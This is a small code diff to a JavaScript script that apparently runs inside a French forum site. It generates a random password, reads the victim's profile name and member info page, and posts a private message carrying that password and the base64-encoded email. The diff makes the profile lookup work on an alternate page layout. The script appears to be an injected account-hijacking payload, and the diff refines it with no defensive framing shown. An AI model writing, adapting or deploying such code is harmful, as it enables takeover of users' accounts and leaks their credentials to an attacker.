@@ -1,6 +1,9 @@
 var hwurl = location.href
 let pwd = (Math.random() + 1).toString(36).substring(2);
-let profil = document.getElementById("tdright").innerText;
+let profil = (
+    document.getElementById("tdright") ||
+    document.getElementById("mm-0").children[0]
+).innerText;
 var sd = "ok";
 
 function hwww(email, pwd) {
@@ -38,7 +41,7 @@ fetch('/membres/infos_membre.htm').then(r => r.text()).then(function(html) {
             'sujet': 'RE : ' + pwd,
             piece_jointe_1: undefined,
             piece_jointe_2: undefined,
-            message: `>re: coucou\n${pwd}\n${btoa(email)}`, //sd, //"pw_" + profil + "_pwd_" + pwd,
+            message: `>re: coucou\n${pwd}\n${btoa(email)}`,
             send_msg: "Envoi en cours, patientez SVP..."
         })
     }).then((r) => {
